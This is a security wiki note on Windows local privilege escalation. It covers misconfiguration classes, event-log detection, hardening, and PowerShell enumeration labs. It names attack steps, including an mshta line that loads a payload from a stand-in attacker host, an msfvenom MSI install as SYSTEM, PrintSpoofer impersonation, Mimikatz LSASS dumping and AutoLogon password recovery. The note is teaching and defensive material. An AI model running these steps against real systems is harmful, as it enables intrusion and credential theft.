---
migration_source: published-html-snapshot
migration_status: needs-editorial-review
---

# Windows Privilege Escalation

## Definition

Windows privilege escalation is the post-foothold operation of moving from a low-integrity / low-privilege Windows user context to a higher one — typically from a standard `Users` group account to `Administrators`, `SYSTEM`, or a Tier 0 identity. Unlike kernel-exploit privesc (which is rare on patched modern Windows), the canonical Windows privesc surface in 2026 is **misconfiguration-driven**: service ACLs, unquoted paths, writable directories on `PATH`, scheduled tasks, AlwaysInstallElevated, stored credentials, token-privilege abuse, and DLL hijacking. The job is enumeration discipline, not exploit-writing.

## Why it matters

Windows local privilege escalation is the bridge between an initial foothold (phish, password spray, exposed service) and the AD attack surface this branch covers. A standard-user shell on a domain-joined workstation cannot Kerberoast a service account whose ticket needs `tgtdeleg`, cannot dump LSASS for [[pass-the-hash-and-ntlm-credential-reuse|Pass-the-Hash]], cannot run [[bloodhound-attack-path-analysis|BloodHound]] with SharpHound's session collection, and cannot reliably perform [[dcsync-and-ntdsdit-extraction|DCSync]] without already having privileged credentials. Local privesc converts the shell into the operating context that the rest of this branch assumes.

The technique also matters as a teaching note because it surfaces three transferable senior facts about Windows:

- **Default Windows is full of historical misconfigurations.** Services installed by third-party software in 2015 with weak ACLs are still on production boxes in 2026. Privesc enumeration is largely *finding accumulated configuration debt*, not finding new vulnerabilities.
- **`SYSTEM` is not the goal. The right identity is.** Modern Windows offense aims at *the identity that lets you do the next thing*: the local admin that runs a service account, the user that has `SeBackupPrivilege`, the account that owns a scheduled task with stored credentials. Blindly chasing `NT AUTHORITY\SYSTEM` misses higher-leverage paths.
- **Privesc and detection move on the same Event IDs.** Every privesc primitive that succeeds generates a recognizable signal in Windows Event Logs — 4624 with `LogonType=2`/`5`/`10`, 4672 (special privileges assigned), 4688 with a suspicious parent process, 4697 (service installation), 4698 (scheduled task creation). Senior operators know which primitives produce which telemetry; senior defenders write detection rules for the same primitives.

## How it works

Windows local privesc reduces to a **3-step loop** repeated across multiple primitive classes:

1. **Enumerate.** Inventory services, scheduled tasks, autoruns, file ACLs on system directories, registry ACLs on service-control keys, stored credentials in Credential Manager / `cmdkey`, current user privileges (`whoami /priv`), members of local privileged groups, AlwaysInstallElevated registry state, unquoted service paths, writable directories on `PATH`. The enumeration is mechanical and exhaustive — tools (winPEAS, PowerUp, Seatbelt) automate it but do not interpret it.
2. **Identify a high-leverage primitive.** Match the enumeration output against the canonical privesc-class list (below). Most boxes have multiple findable primitives; the senior move is picking the quietest one that yields the identity you need.
3. **Exploit and pivot.** Use the chosen primitive to either: gain local administrator rights, gain a different user's session (token impersonation), or recover credentials that authenticate elsewhere. The result frequently chains directly into AD attacks ([[kerberoasting|Kerberoasting]], [[pass-the-hash-and-ntlm-credential-reuse|Pass-the-Hash]], [[bloodhound-attack-path-analysis|BloodHound]] with privileged collection).

A representative enumeration kick-off from a low-priv shell:

```
# Run the canonical enumeration suite.
.\winPEASx64.exe quiet > peas.txt
.\Seatbelt.exe -group=user -outputfile=seatbelt.txt
whoami /all
net localgroup Administrators
```

The bug is not "Windows has too many privileges"; it is *Windows offers many narrow privilege primitives, and historical software installations frequently leave one or more of them in a configuration that yields escalation to anyone who finds it*.

## Techniques / patterns

### The privesc-primitive landscape

The canonical Windows privesc classes — what enumeration tools surface and what operators look for:

| # | Class | Mechanism | Telemetry signal |
| --- | --- | --- | --- |
| 1 | **Weak service permissions** | A service whose binary or registry config is writable by the current user. Replace the binary or change `ImagePath`, restart, gain `SYSTEM`. | Event 4697 (service installed), 4688 (suspicious parent) |
| 2 | **Unquoted service path** | A service `ImagePath` like `C:\Program Files\My App\bin\service.exe` with no quotes. If a writable directory exists along the path (`C:\Program.exe`, `C:\Program Files\My.exe`), Windows can execute the attacker-placed binary. | Event 7045, 4688 |
| 3 | **DLL hijacking** | A service or scheduled task loads a DLL by name without a fully-qualified path; current user can drop a malicious DLL in a directory earlier in the search order. | Event 4688, Sysmon Event 7 (image loaded) |
| 4 | **AlwaysInstallElevated** | `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and the `HKCU` equivalent both set to `1`. Any user can install an MSI as `SYSTEM`. | Event 1033 (MSI installed) + 4624 LogonType=5 (service) |
| 5 | **Token impersonation / `SeImpersonatePrivilege`** | Service accounts (IIS app pools, SQL Server, etc.) often have `SeImpersonatePrivilege`. Tools like *PrintSpoofer*, *RoguePotato*, *GodPotato*, *EfsPotato* trigger a coerced authentication, capture the token, impersonate `SYSTEM`. Single most-common "service-account → SYSTEM" path. | Event 4673 (sensitive privilege used), 4624 LogonType=9 |
| 6 | **Stored credentials** | Passwords in: Credential Manager (`cmdkey /list`), Group Policy Preferences `cpassword` (legacy), unattended-install files (`Unattend.xml`, `sysprep.inf`), registry keys for AutoLogon, browser-cached creds, scripts on disk. Recovering any one of these often yields onward identities. | Event 4663 (file access) if the auditor enabled it |
| 7 | **Scheduled tasks** | A task running as a different user with weak permissions: the operator modifies the task's command line, the task runs as that user. | Event 4698 (task created), 4702 (task updated), 4688 (task execution) |
| 8 | **Writable `PATH` directories** | A directory early on the system `PATH` that the current user can write to. Drop a binary with a common name (`mspaint.exe`, `notepad.exe`); the next administrator command shadows the real binary. | Event 4688 with unexpected parent process |
| 9 | **UAC bypass** | When the current user is in `Administrators` but running with split-token (UAC restricted). Various bypass primitives exist (fodhelper, computerdefaults, sdclt) using auto-elevated binaries with hijackable registry keys. Patched and re-discovered cyclically. | Event 4688 with auto-elevated parent |
| 10 | **Kernel exploit** | Patched Windows kernels are usually unexploitable; legacy / unpatched boxes still have viable kernel exploits (Print Nightmare, CVE-2021-1675/34527; HiveNightmare CVE-2021-36934). Rare on production but real. | Event 4624 LogonType=2, then anomalous behavior |

### Patterns

- **`whoami /priv` is the highest-signal one-liner.** If the output includes `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, or `SeRestorePrivilege`, the privesc path is usually 1 step. Most service-account contexts have at least one of these.
- **Service-account contexts are easier than user contexts.** Compromising an IIS app pool or SQL Server service account is frequently a faster path to `SYSTEM` than escalating from a workstation user — `SeImpersonatePrivilege` is the gift that keeps giving.
- **Enumerate, don't exploit-first.** New operators run a kernel exploit because it's interesting. Senior operators run `winPEAS` → grep for the four canonical findings (writable services, unquoted paths, stored creds, AlwaysInstallElevated) → exploit the quietest match.
- **AppLocker / WDAC change the game.** On hardened endpoints, application allowlisting blocks dropped binaries entirely. Operators shift to PowerShell-based primitives, signed-binary abuse (LOLBAS — `regsvr32`, `mshta`, `rundll32`), or in-memory exploitation. Enumeration must explicitly probe the allowlist policy.
- **Local Admin is rarely the real goal.** The real goal is usually one of: cached domain credentials in LSASS for [[pass-the-hash-and-ntlm-credential-reuse|PtH]], a service account ticket for [[kerberoasting|Kerberoasting]] depth, a configured-stored Kerberos ticket, or local admin on a server that hosts a privileged service. Plan the chain before exploiting the primitive.
- **OPSEC: Sysmon and EDR see the canonical primitives.** Most named privesc tools (winPEAS, PowerUp, the Potato family, fodhelper bypass) are detected by default EDR signatures. Senior operators either patch their tooling, live-off-the-land (LOLBin enumeration), or accept the OPSEC cost.

## Variants and bypasses

Windows privesc operations split by **4 attack-surface categories** worth distinguishing.

### 1. Service-control / file-permission primitives

The bulk of real-world privesc — weak service ACLs, unquoted paths, writable directories, DLL hijacking. Discoverable by enumeration, fixable by configuration. Defender response: audit and remediate; no patches required.

### 2. Token-privilege primitives

`SeImpersonatePrivilege`, `SeAssignPrimaryToken`, `SeBackupPrivilege`, `SeDebugPrivilege`. These exist for legitimate service operation; they become privesc when granted to a context the attacker controls. Defender response: minimize which accounts have these privileges; alert on their use by non-baseline accounts.

### 3. Credential-recovery primitives

LSASS dumping (Mimikatz `sekurlsa::logonpasswords`), DPAPI vault extraction, browser credential stores, GPP `cpassword`, AutoLogon registry, plaintext in scripts. The recovered credentials drive subsequent AD attacks. Defender response: [[pass-the-hash-and-ntlm-credential-reuse|Credential Guard]] for LSASS, LAPS for local admin password reuse, scripted-credential audits.

### 4. Kernel / UAC bypass primitives

Kernel exploits (rare on patched systems but always reappearing), UAC bypasses (frequently re-disclosed via auto-elevated binaries with hijackable references). Defender response: patch promptly, raise UAC slider, prefer JEA (Just-Enough-Administration) over admin accounts.

## Impact

Ordered by typical real-world severity:

- **Local admin / `SYSTEM` on a workstation.** Direct outcome of most primitives. Enables LSASS dumping, scheduled-task persistence, registry tampering, EDR evasion attempts.
- **Cached credential extraction → AD lateral movement.** `SYSTEM` on a workstation that has had a domain admin log in = the domain admin's credentials in LSASS. This is *the* canonical chain from a user workstation to domain compromise. See [[tier-zero-administration-and-paw|Tier 0 Administration]] for the structural break of this chain.
- **Service-account context → SQL or app-tier compromise.** Privesc on an application server (IIS, SQL Server, Exchange) yields service-account context that frequently has linked-server or trust-relationship access to other Tier 1 hosts.
- **Persistence and stealth.** Local admin enables service installation, scheduled tasks, registry-run persistence, and (with `SYSTEM`) tampering with telemetry/EDR agents.
- **Stepping stone to AD attacks.** The reason this note lives in the AD branch: nearly every Windows privesc finding's *next step* is a Kerberos- or NTLM-based AD attack.

## Detection and defense

Ordered by effectiveness:

1.
**LAPS for local-admin password rotation.**
   Windows LAPS (built into Windows 11 / Server 2022+, replacing legacy MS LAPS) rotates local Administrator passwords per-host to unique randomized values stored in AD. Eliminates the "one local admin hash = whole fleet" reuse failure mode that gives privesc its biggest blast radius.

2.
**Credential Guard on every endpoint.**
   Isolates LSASS in Virtual Secure Mode (VSM). Makes in-memory hash extraction fail. The privesc primitive that yielded `SYSTEM` still succeeds; the *value* of `SYSTEM` (extracted hashes) collapses. See [[pass-the-hash-and-ntlm-credential-reuse|Pass-the-Hash]] §Detection-and-defense item 2.

3.
**Audit and remediate the canonical privesc primitives.**
   Quarterly scan with `accesschk.exe`, `PowerUp.ps1` in audit mode, or commercial equivalents:
   - Weak service permissions (`accesschk -uwcqv "Users" *`)
   - Unquoted service paths (`wmic service get name,pathname /format:list | findstr /v "\""`)
   - AlwaysInstallElevated registry state (should be `0` or absent)
   - Writable directories on `PATH`
   - Scheduled tasks with weak ACLs
   Most findings are 5-minute fixes once identified. The discipline is finding them, not fixing them.

4.
**AppLocker or WDAC executable allowlisting.**
   Blocks dropped binaries from running entirely. Defeats most tool-based privesc primitives. Operators shift to LOLBins, but the bar is higher. Most environments deploy this for workstations and lock down servers more aggressively.

5.
**Restricted admin mode and Just-Enough-Administration (JEA).**
   For remote administration: `mstsc /restrictedadmin` does not cache credentials on the target. JEA constrains PowerShell sessions to specific cmdlets/parameters. Both reduce the "admin logged in, credentials cached, workstation compromised" chain.

6.
**Detection on the canonical Event IDs.**
   See [[windows-event-logs|Windows Event Logs]] for the full reference. The privesc-relevant rules:
   - **4697** (service installation) from a non-standard parent process
   - **4698 / 4702** (scheduled task created / updated) from unusual sources
   - **4672** (special privileges assigned) for non-baseline user accounts
   - **4673** (sensitive privilege use — `SeImpersonatePrivilege` etc.) outside of baseline service accounts
   - **4624 LogonType=9** (NewCredentials — the Potato family's signature)
   - **4688** with parent-process anomalies (a command shell parented to a service binary)
   - Sysmon Event 1 (process creation) + Event 3 (network) + Event 7 (image load) for the dropped-binary case

### What does not work as a primary defense

- **Trusting that "non-admin users can't break out".** Default Windows ships with multiple privesc primitives available to standard users out of the box (unquoted-paths, writable PATH directories with old software). Audit, don't assume.
- **Relying on UAC alone.** UAC reduces casual privilege use but most modern UAC bypasses are not vulnerabilities — they're documented auto-elevation behaviors. Raise the slider to "Always notify" and prefer architectural controls.
- **Patching only.** Most privesc primitives are configuration, not CVEs. Patches don't fix weak service ACLs or unquoted paths.
- **Antivirus signature blocking.** Named privesc tools are detected; renamed or recompiled tools are not. Behavioral detection (the Event-ID rules above) is the durable layer.
- **Believing "we have EDR".** EDR catches a meaningful fraction; the privesc surface is broader than EDR rule coverage. Audit-and-remediate is the structural fix.

## Practical labs

Run only against owned lab environments or authorized engagements.

```
# Lab 1 — Inventory current privileges and group memberships.
whoami /priv
whoami /groups
net localgroup Administrators
net user $env:USERNAME
# Look for SeImpersonatePrivilege, SeAssignPrimaryToken, SeBackupPrivilege —
# any of these usually means a single-step path to SYSTEM is available.
```

```
# Lab 2 — Find weak service permissions.
# Requires Sysinternals accesschk.exe in the lab.
.\accesschk.exe -uwcqv "Users" * 2>$null
.\accesschk.exe -uwcqv "Authenticated Users" * 2>$null
# Each result is a service where the listed group can modify configuration.
# Cross-reference against service binary writability:
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"', '' -replace ' .*', ''
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $writable = $acl.Access | Where-Object {
            $_.IdentityReference -match 'Users|Everyone|Authenticated' -and
            $_.FileSystemRights -match 'Write|Modify|FullControl'
        }
        if ($writable) {
            "{0}  ->  writable by: {1}" -f $_.Name, ($writable.IdentityReference -join ', ')
        }
    }
}
```

```
# Lab 3 — Hunt unquoted service paths.
Get-WmiObject Win32_Service |
    Where-Object {
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' '
    } |
    Select-Object Name, PathName, StartName, StartMode
# Each result is a candidate unquoted-path privesc target.
```

```
# Lab 4 — Check AlwaysInstallElevated state.
$hklm = (Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -EA 0).AlwaysInstallElevated
$hkcu = (Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -EA 0).AlwaysInstallElevated
"HKLM AlwaysInstallElevated: $hklm"
"HKCU AlwaysInstallElevated: $hkcu"
# Both = 1 means any user can install MSI as SYSTEM. Build a payload MSI with msfvenom and `msiexec /quiet /i evil.msi`.
```

```
# Lab 5 — Recover stored credentials.
cmdkey /list                                         # Credential Manager entries
Get-ChildItem 'C:\Windows\Panther\Unattend.xml','C:\sysprep.inf' -EA 0
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 2>$null |
    findstr /i 'DefaultUserName DefaultPassword AutoAdminLogon'
# Any hit on stored AutoLogon credentials = direct credential recovery.
```

```
# Lab 6 — Detect canonical privesc primitives (defender side).
# After running the labs above in a controlled lab, query Windows Event Logs:
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4697} -MaxEvents 50 |
    Select-Object TimeCreated,
        @{n='User';e={$_.Properties[1].Value}},
        @{n='ServiceName';e={$_.Properties[4].Value}}
# Event 4697 = a service was installed. From a user context, this is a high-fidelity privesc indicator.
# See <a href="../detection-engineering/windows-event-logs.html">Windows Event Logs</a> for the full Event-ID reference.
```

## Practical examples

- **IIS app pool → SYSTEM via PrintSpoofer.** Operator gains code execution as `IIS APPPOOL\DefaultAppPool`. `whoami /priv` shows `SeImpersonatePrivilege`. `PrintSpoofer.exe -i -c cmd.exe` triggers a coerced authentication via the Print Spooler service and impersonates `SYSTEM`. Total elapsed time from web-app foothold to `SYSTEM`: under a minute.
- **Unquoted service path on a legacy 2014-era application.** Service binary is `C:\Program Files\Acme\My Service\service.exe`, installed without quoting. Users have write access to `C:\`. Operator drops `C:\Program.exe`, restarts the service, gains `SYSTEM`. Fix is one quote character in the `ImagePath` registry value.
- **Stored AutoLogon credential.** Workstation built from a 2018 imaging script that set `DefaultPassword` in the Winlogon registry key. Anyone with read access (including the local user) recovers the build-time admin password. Same password is in use on 1,200 other workstations in the fleet. LAPS would eliminate the reuse.
- **Domain admin RDP'd to a workstation.** Helpdesk member logged into a workstation as domain admin to fix something three months ago. `runas` cached the credential. Operator compromises the workstation, dumps LSASS with Mimikatz, recovers the cached domain admin hash, performs DCSync. The full chain Tier 0 administration is designed to prevent — see [[tier-zero-administration-and-paw|Tier 0 Administration]].
- **AppLocker bypass via LOLBin.** Hardened environment blocks all unsigned executables. Operator uses `mshta.exe http://attacker/payload.hta` to execute a signed-Microsoft-binary that runs attacker content. AppLocker default policies allow signed Microsoft binaries; modern policies must explicitly block the LOLBin set.

## Related notes

- [[kerberoasting]] — frequent precursor when the operator has a domain user credential but not local admin; Kerberoasting yields a service-account password that often is local admin on its host.
- [[as-rep-roasting]] — same pattern from the pre-foothold position.
- [[pass-the-hash-and-ntlm-credential-reuse]] — the canonical follow-up: privesc yields LSASS access, LSASS yields hashes, hashes yield lateral movement.
- [[bloodhound-attack-path-analysis]] — BloodHound's `AdminTo` and `CanRDP` edges identify *which* Windows hosts an operator should privesc on to gain the most onward reach.
- [[tier-zero-administration-and-paw]] — the structural defense that makes the privesc → cached-credential → AD chain impossible.
- [[dcsync-and-ntdsdit-extraction]] — typical endgame two hops downstream of Windows privesc on a workstation hosting a Tier 0 cached credential.
- [[gmsa-and-modern-service-account-hardening]] — defender's mirror for the "service account in Administrators" misconfiguration that gives so many privesc paths their power.
- [[index|Linux Privilege Escalation Index]] — the Linux counterpart branch; sibling discipline with a different primitive landscape.
- [[windows-event-logs|Windows Event Logs]] — the canonical reference for the Event IDs cited in the Detection section.
- [[behavioral-detection-vs-signature-detection|Behavioral vs Signature Detection]] — privesc detection lives in process-tree behavior, not in tool names.
- [[cia-triad-and-what-it-actually-decides|CIA triad]] — privesc is an authorization-integrity breach; the user's authentication identity is intact, the authorization boundary is broken.

### Suggested future atomic notes

- token-impersonation-and-the-potato-family — deep dive on `SeImpersonatePrivilege` abuse with the Potato lineage (Hot/Rotten/Juicy/PrintSpoofer/Rogue/God/Efs).
- uac-bypasses-and-auto-elevated-binaries — the fodhelper / computerdefaults / sdclt class and why UAC is documented behavior, not a security boundary.
- lolbas-living-off-the-land-binaries — the signed-Microsoft-binaries-as-execution-vectors landscape.
- applocker-and-wdac-deployment-patterns — defender-side allowlisting policy design.
- laps-and-local-admin-password-rotation — already seeded from [[pass-the-hash-and-ntlm-credential-reuse|PtH]]; the defensive answer to local-admin reuse.
- sysmon-configuration-and-tuning — the SwiftOnSecurity / Olaf Hartong config patterns for detection of privesc telemetry.
- detect-windows-local-privilege-escalation — defender playbook pair for this note.

## References

- **Foundational:** MITRE ATT&CK TA0004 — Privilege Escalation (tactic) — https://attack.mitre.org/tactics/TA0004/
- **Research / Deep Dive:** Sean Metcalf (ADSecurity.org) — Local Administrator Password Solution and Windows Privilege Escalation Patterns — https://adsecurity.org/?p=4063
- **Official Tool Docs:** Microsoft Sysinternals Suite (accesschk, autoruns, procmon, sysmon) — https://learn.microsoft.com/en-us/sysinternals/
- **Hardening:** Microsoft Learn — Securing privileged access in Windows — https://learn.microsoft.com/en-us/security/privileged-access-workstations/overview
